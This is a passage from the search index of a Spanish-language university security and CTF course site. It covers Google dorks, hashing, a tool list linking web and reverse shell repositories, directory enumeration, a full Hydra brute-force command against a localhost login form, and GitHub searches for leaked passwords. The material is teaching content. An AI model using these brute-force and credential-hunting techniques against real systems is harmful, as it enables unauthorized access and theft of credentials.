Dorks\u003c/em\u003e, es una\nforma de realizar búsquedas en Google que nos permite filtrar ciertas palabras, imponer restricciones de\ntipos de archivos o de fuentes, realizar la búsqueda solo en el título, URL o cuerpo, entre muchas otras cosas.\nEsto se hace mediante la inclusión de ciertos flags o caracteres en la búsqueda. Pueden encontrar una\nlista completa de flags \u003ca href=\"https://gbhackers.com/latest-google-dorks-list/\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eLas más útiles en general son las siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExclusión\u003c/strong\u003e: Se pueden excluir todos los resultados que contengan cierto término de la forma \u003ccode\u003e-\u0026lt;keyword\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eResultado Literal\u003c/strong\u003e: Si quieren buscar por un término literal (excluyendo palabras parecidas, sinónimos, etc),\nutilizan las comillas dobles \u003ccode\u003e\u0026quot;\u0026lt;keyword\u0026gt;\u0026quot;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTipo de Archivo\u003c/strong\u003e: Si están buscando algún tipo de archivo en específico, como PDF,\nutilizan \u003ccode\u003efiletype:\u0026lt;type\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFuente\u003c/strong\u003e: Si están buscando resultados exclusivamente de un sitio en particular usan \u003ccode\u003esite:\u0026lt;URL\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa flag de exclusión se puede combinar con otras flags, como para excluir todos los resultados de un\nsitio en particular \u003ccode\u003e-site:\u0026lt;URL\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos buscar información sobre inyecciones SQL, por lo que hacemos lo siguiente:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search1.png\" alt=\"SQLi search\"\u003e\u003c/p\u003e\n\u003cp\u003ePero nosotros queremos solo resultados de OWASP, por lo que agregamos la flag \u003ccode\u003esite:owasp.org\u003c/code\u003e y obtenemos\nlo que queremos (ignorando el AD):\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search2.png\" alt=\"SQLi search from OWASP\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, los documentos académicos usualmente están en formato PDF, por lo que buscamos solo resultados\nque cumplan esa condición con \u003ccode\u003efiletype:pdf\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search3.png\" alt=\"SQLi search in PDF format\"\u003e\u003c/p\u003e\n"},{id:10,href:"/docs/cripto-moderna/hashing/",title:"Hashing",description:null,content:"\u003cp\u003eLas funciones de \u003cem\u003ehash\u003c/em\u003e son utilizadas como un bloque fundamental en muchos otros componentes criptográficos, tales como firmas digitales, cifrado de llave pública, verificación de integridad de archivos, autentificación de mensajes, contraseñas, entre otros.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../hash.jpg\" alt=\"Función de hash\"\u003e\u003c/p\u003e\n\u003cp\u003eComo muestra la imagen anterior (del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e), una función de hash recibe un mensaje de longitud arbitraria, y devuelve un valor de tamaño fijo (generalmente entre 256 y 512 bits). Al mismo tiempo, una \u0026ldquo;buena función de hash\u0026rdquo; para usos criptográficos es una función que cumple las siguientes características:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn cambio chico en el mensaje provoca un cambio muy grande en el valor devuelto por la función de hash.\u003c/li\u003e\n\u003cli\u003eDado un valor devuelto por la función de hash a partir de un mensaje $M$, es demasiado dificil encontrar un valor que produzca ese valor sin conocer $M$.\u003c/li\u003e\n\u003cli\u003eSi bien es obvio que existen colisiones (es decir, dos mensajes distintos entre sí $M_1$ y $M_2$ tales que $H(M_1) == H(M_2)$), encontrar dos mensajes que colisionen debe ser demasiado difícil.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplos-de-funciones-de-hash\"\u003eEjemplos de Funciones de hash\u003c/h2\u003e\n\u003cp\u003eA continuación se nombrarán algunas funciones de hash usadas ampliamente\u003c/p\u003e\n\u003ch3 id=\"md5\"\u003eMD5\u003c/h3\u003e\n\u003cp\u003eMD5 es un algoritmo de hashing basado en una \u003ca href=\"https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction\"\u003econstrucción Merkle-Damgård\u003c/a\u003e que produce un valor de 128 bits, usando bloques de 512 bits en sus procedimientos internos. Este algoritmo fue creado el año 1992, y ya el 1996 se conocían problemas en él. El año 2004 un grupo de investigadores mostró que MD5 no es resistente a colisiones, además de publicar un método práctico para crear datos con el mismo hash pero distinto contenido (ataques de colisión), lo que hizo que se deprecara como hash seguro. Más información sobre la función de hash se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/MD5\"\u003eWikipedia\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAtaques conocidos\u003c/strong\u003e: \u003ca href=\"https://en.wikipedia.org/wiki/Length_extension_attack\"\u003eAtaque de exensión de longitud (a partir de su construcción)\u003c/a\u003e,  \u003ca href=\"https://en.wikipedia.org/wiki/Collision_attack\"\u003eAtaques de Colisión\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"sha-1\"\u003eSHA-1\u003c/h3\u003e\n\u003cp\u003eSHA-1 es una función criptográfica creada el año 1995 y basada al igual que MD5 en una construcción Merkle-Damgård. Esta función produce un valor de salida 160 bits. El año 2011 fue deprecada por el NIST por problemas similares a los encontrados en MD5. Hoy en día, los ataques de prefijo elegido en SHA1 son prácticos. Más información y descripción de ataques en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-1\"\u003eWikipedia\u003c/a\u003e. Al año actual (2021), es factible para una organización con hartos recursos económicos (cientos de miles de dólares) ejecutar un ataque de colisión de hashes.\u003c/p\u003e\n\u003ch3 id=\"sha-2\"\u003eSHA-2\u003c/h3\u003e\n\u003cp\u003eSHA-2 es una función criptográfica creada el año 2001 por la NSA. Usa la misma primitiva que MD5 y SHA-1 (Merkle-Damgård) pero posee seis variaciones distintas de largo de salida: SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224 y SHA-512-256. Al momento, no se conocen ataques prácticos a este hash. Más información se puede obtener en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-2\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"sha-3\"\u003eSHA-3\u003c/h3\u003e\n\u003cp\u003eSHA-3 es una función criptográfica creada el año 2015 por el NIST. Es internamente diferente a las funciones ya mencionadas porque utiliza una \u003ca href=\"https://en.wikipedia.org/wiki/Sponge_function\"\u003econstrucción de esponja\u003c/a\u003e. Su existencia y estandarización permite que en caso que a futuro se encuentren problemas en la primitiva de SHA-2 (todavía considerada segura), exista una alternativa de uso de fácil modificación que no debiese ser afectada por este problema.\u003c/p\u003e\n\u003ch3 id=\"funciones-de-derivación-de-llaves-kdf\"\u003eFunciones de derivación de llaves (KDF)\u003c/h3\u003e\n\u003cp\u003eEs una categoría de funciones de hash que deriva una o más llaves secretas a partir de una llave principal, usando una función pseudoaleatoria. Estas funciones suelen tener la característica de que sus valores de salida son lentos de verificar (del orden de segundos) debido a que la cantidad de veces que se ejecutan es configurable\u0026quot;, lo que mitiga el riesgo de un ataque de fuerza bruta para detectar la preimagen de un valor dado. La capacidad de configurar las iteraciones también prepara a la función para el futuro, de forma de poder subir este número arbitrariamente a medida las capacidades de los computadores aumentan.\u003c/p\u003e\n\u003cp\u003eOtra medida de mitigación de estas funciones es que requieren para funcionar un valor extra no secreto denominado \u003cstrong\u003esalt\u003c/strong\u003e. El valor \u003cstrong\u003esalt\u003c/strong\u003e es aleatorio y se usa para la generación y verificación del hash con una función KDF. De esta forma, se limita el riesgo de amenazas tales como \u003ca href=\"https://en.wikipedia.org/wiki/Rainbow_table\"\u003erainbow tables\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eA continuación se mencionan algunas funciones de tipo KDF:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/PBKDF2\"\u003ePBKDF1 y PBKDF2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Argon2\"\u003eArgon2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:11,href:"/docs/anexos/herramientas/",title:"Herramientas",description:null,content:"\u003cp\u003eA continuación se agrupan enlaces a herramientas útiles para cada una de las siguientes categorías de problemas. Estas herramientas son mencionadas en cada capítulo de forma desordenada, por lo que esta sección sirve para encontrarlas directamente.\u003c/p\u003e\n\u003ch2 id=\"esteganografía\"\u003eEsteganografía\u003c/h2\u003e\n\u003ch2 id=\"criptografía-moderna\"\u003eCriptografía Moderna\u003c/h2\u003e\n\u003ch2 id=\"aplicaciones-web\"\u003eAplicaciones Web\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\"\u003eFoxyProxy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003eBurp Suite Community Edition\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/maurosoria/dirsearch\"\u003eDirsearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/xmendez/wfuzz\"\u003eWfuzz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vanhauser-thc/thc-hydra\"\u003eHydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sqlmapproject/sqlmap\"\u003eSqlmap\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/tennc/webshell\"\u003eRepo de Web Shells\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\"\u003eRepo de Reverse Shells\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/calebstewart/pwncat\"\u003ePwncat\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/searchsploit\"\u003eSearchsploit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"análisis-forense\"\u003eAnálisis Forense\u003c/h2\u003e\n\u003ch2 id=\"ingeniería-reversa\"\u003eIngeniería Reversa\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://rada.re/n/radare2.html\"\u003eRadare2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ghidra-sre.org/\"\u003eGhidra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://java-decompiler.github.io/\"\u003eJD-GUI\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://pypi.org/project/uncompyle6/\"\u003euncompyle6\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rocky/python-decompile3\"\u003edecompyle3\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pwning\"\u003ePwning\u003c/h2\u003e\n\u003ch2 id=\"osint\"\u003eOSINT\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/laramies/theHarvester\"\u003etheHarvester\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.shodan.io/\"\u003eShodan\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:12,href:"/docs/apps-web/tecnicas-basicas/",title:"Técnicas Básicas de Análisis Web",description:null,content:"\u003cp\u003eEn este capítulo hablaremos de algunas de las técnicas más básicas utilizadas para en análisis web.\nPara estas no se requiere ningún o casi ningún conocimiento sobre el funcionamiento o características del sitio,\ny pueden ser aplicadas de manera casi inmediata. Usualmente se utiliza herramientas muy simples, que\nrequieren muy poca configuración para ser usadas. Desde el lado del servidor, suele ser bastante fácil detectar el uso de estas herramientas, por lo que\nlos sistemas relativamente bien monitoreados usualmente bloquean IPs con este comportamiento.\u003c/p\u003e\n\u003cp\u003eEl objetivo de las herramientas que veremos ahora es obtener más información sobre el servicio web,\nencontrando archivos, usuarios y otros recursos que pueden estar escondidos. Si tienen mucha suerte,\nesto también puede resultar en la divulgación de información privada, sensible o crítica,\no incluso pueden ganar privilegios si logran encontrar contraseñas.\u003c/p\u003e\n\u003ch2 id=\"enumeración\"\u003eEnumeración\u003c/h2\u003e\n\u003cp\u003eLa enumeración es un proceso en el cual se itera por una lista de valores (llamadas diccionarios), intentando\nencontrar información nueva. Esto se puede aplicar a subdirectorios de un sitio web, subdominios,\nnombres de usuario, nombres de parámetros, servicios ofrecidos, puertos abiertos, etc.\nTambién se puede utilizar fuzzers, los cuales toman un input conocido y lo modifican de múltiples maneras\npara encontrar otros inputs con comportamientos diferentes.\u003c/p\u003e\n\u003cp\u003eEste proceso funciona enviando las distintas peticiones al servidor y analizando sus respuestas. No se\nsuele encontrar muchas vulnerabilidades de esta forma, pero sí se logra recopilar información\ny funcionalidades previamente no vistas.\u003c/p\u003e\n\u003cp\u003eLas herramientas comúnmente usadas en el área web son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/OJ/gobuster\"\u003eGobuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/maurosoria/dirsearch\"\u003eDirsearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/KajanM/DirBuster\"\u003eDirbuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/v0re/dirb\"\u003eDirb\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/aboul3la/Sublist3r\"\u003eSublist3r\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/xmendez/wfuzz\"\u003eWfuzz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ffuf/ffuf\"\u003eFfuf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"fuerza-bruta\"\u003eFuerza Bruta\u003c/h2\u003e\n\u003cp\u003eSimilar a la enumeración, pero en este caso se intenta pasar por todos o casi todos los valores posibles\nde un parámetro, aunque en muchos casos también se utiliza diccionarios. Se diferencian principalmente\nde manera conceptual, y en que la acción realizada usualmente tiene uno o unos pocos valores \u0026ldquo;correctos\u0026rdquo;,\nlos cuales resultan en una respuesta diferente del servidor (por ejemplo, ingresar una contraseña correcta\ntiene un resultado diferente al de ingresar una contraseña incorrecta).\nMediante la fuerza bruta se pueden encontrar contraseñas de usuarios, valores\naleatorizados, parámetros mágicos, secuencias específicas, etc.\u003c/p\u003e\n\u003cp\u003eLas herramientas usualmente utilizadas son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vanhauser-thc/thc-hydra\"\u003eHydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eVarios módulos de \u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eOcuparemos Dirsearch para enumerar directorios en el host \u003ccode\u003e127.0.0.1:8000\u003c/code\u003e, el cual sabemos que está corriendo\nun servicio PHP. Utilizamos la flag \u003ccode\u003e-e\u003c/code\u003e para indicar la extensión de archivo que queremos buscar, y \u003ccode\u003e-u\u003c/code\u003e\npara indicar la URL base. El comando completo es:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003edirsearch -e php -u http://127.0.0.1:8000/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eY obtenemos este resultado, en donde encontramos el archivo \u003ccode\u003eusers.php\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../dirsearch-result.png\" alt=\"Dirsearch Result\"\u003e\u003c/p\u003e\n\u003cp\u003eAnalizando el sitio sabemos que este es un formulario de login, por lo que le realizamos un ataque de\nfuerza bruta usando hydra. La flag \u003ccode\u003e-L\u003c/code\u003e indica el archivo con nombres de usuario, \u003ccode\u003e-P\u003c/code\u003e el archivo con contraseñas,\n\u003ccode\u003e-u\u003c/code\u003e itera por los usuarios en vez de las contraseñas y \u003ccode\u003e-s\u003c/code\u003e define el puerto. Adicionalmente debemos entregarle\nla IP del objetivo y el tipo de request (en este caso \u003ccode\u003ehttp-post-form\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eEl último parámetro se divide en 3\npartes separado por el caracter \u003ccode\u003e:\u003c/code\u003e. Primero está la ruta al archivo con el formulario, luego tenemos los\ndatos que se enviarán en la consulta POST (\u003ccode\u003e^USER^\u003c/code\u003e se reemplaza por el nombre de usuario y \u003ccode\u003e^PASS^\u003c/code\u003e por la\ncontraseña), y finalmente le entregamos un valor para reconocer los intentos fallidos (\u003ccode\u003eIncorrect credentials\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eEl comando completo es:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehydra -L /usr/share/wordlists/metasploit/unix_users.txt \\\n-P /usr/share/wordlists/rockyou.txt -u -s 8000 127.0.0.1 http-post-form \\\n\u0026quot;/users.php:user=^USER^\u0026amp;pass=^PASS^:Incorrect credentials\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"../hydra-bruteforce.png\" alt=\"Hydra Bruteforce\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego de correr el comando obtenemos las credenciales \u003ccode\u003eadmin:password\u003c/code\u003e.\u003c/p\u003e\n"},{id:13,href:"/docs/intro/intro/",title:"Introducción a la Programación",description:null,content:"\u003cp\u003eEn esta sección se explican todos los conceptos previos necesarios para empezar a resolver problemas de programación. Sientete libre de omitir esta parte si sabes como funciona la programación o has tenido experiencia programado antes.\u003c/p\u003e\n\u003ch2 id=\"conceptos-básicos\"\u003eConceptos Básicos\u003c/h2\u003e\n\u003cp\u003eLa programación está definida a partir de pequeños bloques de código, una serie de instrucciones que se ejecutan una detrás de la otra. La manera en que se ejecutan estas instrucciones se define como un \u0026ldquo;\u003cem\u003ealgoritmo\u003c/em\u003e\u0026rdquo;, lo que nos describe la forma en que se resuelve un problema, es decir la lógica que se utilizó para resolver el problema, pero no necesariamente de su implementación. Mientras que la lógica tras la resolución de un problema puede ser la misma, no necesariamente va a estar implementada de la misma manera, esa es la diferencia con el \u0026ldquo;\u003cem\u003eprograma\u003c/em\u003e\u0026rdquo; es decir, el código ya escrito, listo para ser interpretado, pues mientras que pueden representar el mismo algoritmo, el código puede estar escrito en lenguajes de programación distinto (tales como c++, kotlin o python) o usar una cantidad de valores distintos.\u003c/p\u003e\n\u003cp\u003eA la hora de programar, debemos crear una serie de instrucciones, las cuales deben usar cierta información dada para obtener un resultado (al que llamamos input), por ejemplo, si queremos calcular el perimetro de un cuadrado tenemos que multiplicar por 4 el lado de un cuadrado: en este caso el \u0026ldquo;input\u0026rdquo; de nuestro programa será el largo de un lado del cuadrado, tenemos que multiplicar por 4 y luego entregar dicho resultado (es decir, el \u0026ldquo;output\u0026rdquo;).\u003c/p\u003e\n\u003cp\u003eAquí identificamos tres instrucciones: leer un número, multiplicarlo por 4, y entregar el perímetro. Aquellos valores que cambian, como en este caso lo es el lado del cuadrado, serán nuestras \u003cem\u003evariables\u003c/em\u003e, valores que el programa almacena en un espacio definido y que tienen un nombre asociado. A esta le podemos poner \u0026ldquo;lado\u0026rdquo;, para que así retornemos 4*lado, por ejemplo. Estas variables tienen distintos tipos, y se comportan diferente en cada lenguaje de programación, pero en este caso describiremos los principalmente usados en programación competitiva en c++.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-variables\"\u003eTipos de variables\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNúmeros\u003c/strong\u003e: Tenemos distintos tipos de números, los cuales cumplen funciones distintas. Hay que tener ojo con que pertenezcan al rango correspondiente, ya que en caso de superar uno de estos límites se genera un \u0026ldquo;overflow\u0026rdquo;, o \u0026ldquo;underflow\u0026rdquo;, lo que distorsiona el número y no nos da el valor deseado. Tenemos 3 tipos básicos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eint\u003c/em\u003e: Se usa para enteros (\u003cem\u003eintegers\u003c/em\u003e en inglés) y cubren valores entre -2,147,483,648 y 2,147,483,647 (correspondiendo al 2\u003csup\u003e31\u003c/sup\u003e-1). Como regla general, se usa para valores entre el -2*10\u003csup\u003e10\u003c/sup\u003e y 2*10\u003csup\u003e10\u003c/sup\u003e. Tienen la desventaja de no poder almacenar valores decimales pero son útiles en la mayoría de las situaciones. La operación de estos siempre te dará resultado entero, por lo que hay que tener ojo con la division entera (3/2 = 1 bajo esta lógica).\u003c/li\u003e\n\u003cli\u003e\u003cem\u003elong long int\u003c/em\u003e: Usualmente conocido simplemente como \u0026ldquo;\u003cem\u003elong long\u003c/em\u003e\u0026rdquo;, se usa en caso de que necesites un rango mayor que el int, el rango es de –9, 223, 372, 036, 854, 775, 808 a 9, 223, 372, 036, 854, 775, 807. Esto nos permite trabajar con números entre -10\u003csup\u003e18\u003c/sup\u003e y 10\u003csup\u003e18\u003c/sup\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cem\u003efloat\u003c/em\u003e: Este tipo se usa para trabajar números con decimales. Por las limitaciones de la memoria este número contiene un valor aproximado hasta cierto decimal, pero no tiende a importar tanto pues generalmente se usa para calculos numericos no tan precisos, considerando el rango de decimales.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCadenas\u003c/strong\u003e: Se usan para registrar \u0026ldquo;palabras\u0026rdquo; o \u0026ldquo;caracteres\u0026rdquo;. Puede incluir letras, números y simbolos, por lo que hay que tener cuidado a la hora de manipular números como variables de este tipo, pues no se comportan igual (no es lo mismo el número 2 que el caracter \u0026ldquo;2\u0026rdquo;, podemos sumar números pero no caracteres). En esta categoría tenemos dos tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003echar\u003c/em\u003e: La unidad mínima, almacenando un único caracter. Ej: \u0026ldquo;h\u0026rdquo;, \u0026ldquo;2\u0026rdquo;, \u0026ldquo;o\u0026rdquo;, etc.\u003c/li\u003e\n\u003cli\u003e\u003cem\u003estring\u003c/em\u003e: El tipo más usado de las cadenas, es un arreglo (es decir, una serie ordenada) de \u0026ldquo;char\u0026quot;s, con lo que puedes procesar varios caracteres seguidos. Ej: \u0026ldquo;hola\u0026rdquo;, \u0026ldquo;c++\u0026rdquo;, \u0026ldquo;123\u0026rdquo;, \u0026ldquo;h0l4\u0026rdquo;, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBooleanos\u003c/strong\u003e: Es el tipo más pequeño, almacenando dos posibles valores, \u0026ldquo;\u003cem\u003eTrue\u003c/em\u003e\u0026rdquo; (para verdadero) y \u0026ldquo;\u003cem\u003eFalse\u003c/em\u003e\u0026rdquo; (para falso). Se guarda para registrar si cierta condición se cumple.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:14,href:"/docs/osint/github/",title:"Búsqueda en Github",description:null,content:"\u003cp\u003eGithub contiene una cantidad impresionantemente grande repositorios, código y datos. Muchas veces se puede\nencontrar información privada dentro de estos, como contraseñas, por lo cual poder buscar dentro de\nellos es muy útil. Esto se hace con la \u003ca href=\"https://github.com/search/advanced\"\u003ebúsqueda avanzada de Github\u003c/a\u003e,\nla cual retorna información sobre los repositorios públicos.\u003c/p\u003e\n\u003cp\u003eDe manera similar a Google Dorks, Github tiene un sistema de flags en su búsqueda para filtrar los resultados.\nPueden encontrar documentación sobre esto \u003ca href=\"https://docs.github.com/en/github/searching-for-information-on-github/getting-started-with-searching-on-github\"\u003eaquí\u003c/a\u003e.\nEn este caso, los flags disponibles están más enfocados a filtrar características importantes de un\nrepositorio (por ejemplo la cantidad de forks con \u003ccode\u003efork:\u0026lt;n\u0026gt;\u003c/code\u003e). También se puede buscar repos cuyos archivos\ncumplan ciertas características, como en su extensión (\u003ccode\u003eextension:\u0026lt;ext\u0026gt;\u003c/code\u003e).\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eBuscaremos repositorios que contengan la palabra \u003ccode\u003epassword\u003c/code\u003e con el objetivo de encontrar alguna contraseña\nolvidada que no debería estar ahí. Pero al igual que con las búsquedas en Google, queremos restringir\nlos resultados obtenidos para filtrar los falsos positivos. Para eso además incluimos las flags\n\u003ccode\u003eforks:0\u003c/code\u003e, ya que un repositorio con forks probablemente está siendo revisado y la contraseña ya fue\nencontrada, y \u003ccode\u003eextension:txt\u003c/code\u003e, pues buscamos contraseñas en texto plano.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../github-passwords.png\" alt=\"Github Passwords\"\u003e\u003c/p\u003e\n\u003cp\u003eEncontramos muchos resultados, los cuales deben ser revisados manualmente, o se puede restringir aún más\nla búsqueda para acelerar el proceso.\u003c/p\u003e\n"},{id:15,href:"/docs/anexos/vpn/",title:"Configuración de VPN",description:null,content:"\u003cp\u003ePara poder tener acceso a la máquina que se usará en los CTF y tareas, necesitan conectarse por VPN a la red de la Universidad. A continuación se enumeran los pasos necesarios para hacer esto.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInicien sesión en la máquina Kali que se usará en el curso\u003c/li\u003e\n\u003cli\u003eDescargar perfil OpenVPN del CEC desde \u003ca href=\"https://www.cec.uchile.cl/download/OPENVPN/CEC-fcfm.ovpn\"\u003eacá\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eAbrir un terminal en la carpeta en que descargaron el archivo y ejecutar \u003ccode\u003esudo openvpn CEC-fcfm.ovpn\u003c/code\u003e. Colocar como datos de inicio de sesión los datos de la cuenta del CEC (sin incluir @ing.uchile.cl).\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:16,href:"/docs/cripto-moderna/cripto-simetrica/",title:"Criptografía Simétrica",description:null,content:"\u003cp\u003eEn esta sección hablaremos de tres tipos de cifrado: \u003cstrong\u003eOne-time pad\u003c/strong\u003e, \u003cstrong\u003ecifradores de bloque\u003c/strong\u003e y \u003cstrong\u003ecifradores de flujo\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"one-time-pad\"\u003eOne-Time Pad\u003c/h2\u003e\n\u003cp\u003eCorresponde a una técnica de cifrado que no puede ser rota si la llave no se reusa, en la cual un mensaje se cifra ejecutando la operación \u003ccode\u003exor\u003c/code\u003e entre un valor aleatorio al menos del tamaño del mensaje y el mismo mensaje. Lamentablemente, este tipo de cifrado no es muy práctico, debido a la dificultad de conseguir una fuente de valores realmente aleatorios que pueda al mismo tiempo estar sincronizada entre las partes que desean comunicarse.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-bloque\"\u003eCifradores de bloque\u003c/h2\u003e\n\u003cp\u003eLos cifadores de bloque permiten cifrar mensajes de un tamaño fijo (\u003cem\u003econocido como $BlockSize$\u003c/em\u003e) utilizando una llave de con otro tamaño fijo (\u003cem\u003econocido como $KeySize$\u003c/em\u003e). Si el mensaje es más largo que la llave, es necesario dividirlo en \u003cstrong\u003ebloques\u003c/strong\u003e del tamaño adecuado y usar un \u003cstrong\u003emodo de operación\u003c/strong\u003e que permita encadenar estos bloques.\u003c/p\u003e\n\u003cp\u003eEl principio básico del proceso de Cifrado $E$ del cifrador de bloque consiste en ejecutar varias rondas de permutación y sustitución definidas sobre el bloque de texto plano $P$, de tal forma de obtener un nuevo bloque cifrado $C$. Las permutaciones y sustituciones son definidas por una llave $K$, la cual es entregada al cifrador de bloque como entrada, además de $C$. Para descifrar un bloque $C$ (proceso de descifrado $D$), se ejecutan operaciones inversas a las de $E$. Lo anterior se puede observar en la imagen siguiente, obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cifrado.jpg\" alt=\"Esquema abstracto de los procesos de cifrado y descifrado\"\u003e\u003c/p\u003e\n\u003cp\u003eUna característica importante para un buen cifrador, es que la salida $C$ no permita derivar nada ni de $K$ ni de $P$. Para esto, las salidas $C$ deben verse como datos aleatorios (es decir, no tener patrones).\u003c/p\u003e\n\u003cp\u003eEl tamaño de la llave es importante para evitar ataques de fuerza bruta sobre el cifrador. Si la llave es pequeña no es una tarea imposible probar descifrar un bloque cifrado con todas las llaves posibles. Una llave de 16 bits requeriría del orden de 65 mil 